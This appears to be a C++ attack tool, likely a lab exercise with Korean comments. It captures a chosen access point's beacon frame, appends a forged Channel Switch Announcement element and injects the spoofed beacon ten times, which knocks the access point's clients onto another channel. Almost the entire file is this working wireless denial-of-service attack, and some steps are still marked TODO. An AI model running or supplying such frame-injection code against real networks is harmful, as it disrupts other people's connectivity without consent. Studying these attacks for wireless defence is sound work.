#include "mac.h"
#include "pch.h"
#include "handler.h"
#include "macframe.h"
#include "management.h"
#include "ie.h"
#include "radiotap.h"
#include "config.h"


void usage()
{
    std::cout << "Usage: ./csa <interface> <ap_mac> " << std::endl;
}

int check_args(int argc, char* argv[])
{
    if (argc != 3) {
        usage();
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}



int main(int argc, char* argv[]) {
    if (check_args(argc, argv) == EXIT_FAILURE) {
        return EXIT_FAILURE ;
    }
    //==========Config initialization==========

    Config config;
    config.interface = argv[1];
    config.ap_mac = Mac(argv[2]);

    //==========PCAP initialization==========

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = handle_init(config.interface.c_str(), errbuf);
    if(pcap == nullptr) 
    {
        return EXIT_FAILURE;
    }
    //=========Find target AP's beacon frame=========
    
    const u_char* packet;
    int packet_len; //라디오탭 제거된 패킷 길이
    packet = find_target_beacon(pcap, &config, &packet_len);
    ieee80211_mac_header* mac_header = (ieee80211_mac_header*)packet;

    dump(packet, packet_len);
    std::cout << "========================" << std::endl;

    //=========Make CSA frame=========

    std::cout << "Current Channel: " << config.ap_current_channel << std::endl;
    int switchChannel = setSwitchChannel(config.ap_current_channel);
    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(switchChannel, 3);

    //=========Parse beacon frame body=========
    beacon_frame_body* frame_body = (beacon_frame_body*)(packet + sizeof(ieee80211_mac_header));
    // dump((const u_char*)frame_body, sizeof(*frame_body));

    //TODO : Beacon 타임스탬프 설정


    //=======패킷 조합========
    // TODO : radiotap header + mac header + beacon frame body + csa_ie 조합해서 새로운 패킷 생성
    int copy_len = packet_len; // FCS 제거
    int new_packet_len = copy_len + sizeof(csa_ie);
    u_char* new_packet = new u_char[new_packet_len];


    //기존 FCS 제거된 패킷 복사
    memcpy(new_packet, packet, copy_len);
    //CSA IE 삽입
    memcpy(new_packet + copy_len, &csa_ie, sizeof(csa_ie));


    dump(new_packet, new_packet_len);


    //============CSA 프레임 송신 ===========
    for(int i=0;i<10;i++)
    {
        int res = pcap_sendpacket(pcap, new_packet, new_packet_len);
        if (res != 0) {
            std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap) << std::endl;
        }
        else{
            std::cout << "Sent CSA frame to AP " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
        }
        
    }

    delete[] new_packet;
    return 0;
}